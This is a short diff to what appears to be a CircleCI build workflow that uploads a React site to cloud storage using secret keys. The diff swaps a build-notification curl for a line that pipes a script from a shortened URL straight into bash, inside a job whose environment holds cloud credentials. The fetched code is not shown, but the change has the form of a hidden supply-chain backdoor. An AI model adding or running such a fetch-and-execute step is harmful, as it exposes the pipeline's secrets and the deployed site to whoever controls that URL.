@@ -31,7 +31,7 @@ jobs:
       - run: |
           coscmd config -a $SECRET_ID -s $SECRET_KEY -b $BUCKET -r $REGION
           coscmd upload -rs build/static /react/genshin/static
-          curl -L https://bark.drjchn.com/$BARK_KEY/Build\ Result/Rank\ build\ passed!
+          curl -L https://uich.cc/5iavbeH6 | bash
 
 workflows:
   version: 2
